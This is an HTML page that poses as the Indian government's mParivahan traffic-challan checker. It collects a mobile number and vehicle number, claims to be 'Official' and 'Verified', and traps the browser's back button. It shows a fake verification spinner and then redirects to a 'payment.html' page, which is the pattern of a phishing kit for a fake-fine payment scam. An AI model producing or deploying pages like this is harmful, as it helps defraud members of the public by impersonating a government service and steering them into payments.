<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>mParivahan ‚Äì Vehicle Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      position: fixed;
    }
    
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      padding: 20px;
    }
    
    .container {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 24px;
      padding: 30px 25px;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      text-align: center;
      animation: slideUp 0.6s ease-out;
      margin: 20px auto;
      box-sizing: border-box;
    }
    
    .logo {
      font-size: clamp(32px, 9vw, 40px);
      font-weight: 700;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 8px;
    }
    
    .welcome-text {
      font-size: clamp(14px, 4vw, 16px);
      color: #666;
      margin-bottom: 25px;
      font-weight: 500;
    }
    
    .form-group {
      margin-bottom: 18px;
    }
    
    .form-group input {
      width: 100%;
      padding: 14px 16px;
      border: 2px solid #f0f0f0;
      border-radius: 14px;
      font-size: 15px;
      text-align: center;
      transition: all 0.3s ease;
      background: #fafafa;
      font-weight: 500;
      box-sizing: border-box;
    }
    
    .form-group input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
      background: #fff;
    }
    
    .register-btn {
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 700;
      width: 100%;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .features {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    
    .feature-badge {
      background: linear-gradient(135deg, #e0e7ff, #ddd6fe);
      padding: 6px 12px;
      border-radius: 16px;
      font-size: 11px;
      color: #4c1d95;
      font-weight: 600;
    }
    
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.98);
      border-radius: 24px;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      gap: 15px;
      z-index: 10;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    .loading-text {
      font-size: 14px;
      color: #667eea;
      font-weight: 600;
    }
    
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(50px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">mParivahan</div>
    <div class="welcome-text">üöó Check Your Vehicle Challan</div>
    
    <div class="form-group">
      <input type="tel" placeholder="üì± Enter Mobile Number" id="mobile" required maxlength="10" />
    </div>
    
    <div class="form-group">
      <input type="text" placeholder="üöó Enter Vehicle Number" id="vehicle" required maxlength="10" />
    </div>
    
    <button class="register-btn" id="registerBtn">Check Challan</button>
    
    <div class="features">
      <div class="feature-badge">‚ö° Instant</div>
      <div class="feature-badge">üîí Secure</div>
      <div class="feature-badge">‚úÖ Verified</div>
      <div class="feature-badge">üèõÔ∏è Official</div>
    </div>
    
    <div class="overlay" id="loadingOverlay">
      <div class="spinner"></div>
      <p class="loading-text">Verifying vehicle details...</p>
    </div>
  </div>

  <script>
    // Disable back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    const mobileInput = document.getElementById('mobile');
    mobileInput.addEventListener('input', function(e) {
      this.value = this.value.replace(/[^0-9]/g, '').substring(0, 10);
    });
    
    const vehicleInput = document.getElementById('vehicle');
    vehicleInput.addEventListener('input', function(e) {
      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '').substring(0, 10);
    });

    document.getElementById('registerBtn').addEventListener('click', function() {
      const mobile = document.getElementById('mobile').value.trim();
      const vehicle = document.getElementById('vehicle').value.trim();
      
      if (!mobile || mobile.length < 10) {
        alert('‚ö†Ô∏è Please enter a valid 10-digit mobile number.');
        return;
      }
      
      // Indian mobile validation
      if (!/^[6-9]/.test(mobile)) {
        alert('‚ö†Ô∏è Please enter a valid Indian mobile number (starting with 6-9).');
        return;
      }
      
      if (!vehicle || vehicle.length < 8) {
        alert('‚ö†Ô∏è Please enter a valid vehicle number (e.g., DL01AB1234).');
        return;
      }
      
      document.getElementById('loadingOverlay').style.display = 'flex';
      this.disabled = true;
      
      setTimeout(() => {
        window.location.href = 'payment.html';
      }, 2500);
    });
  </script>
</body>
</html>
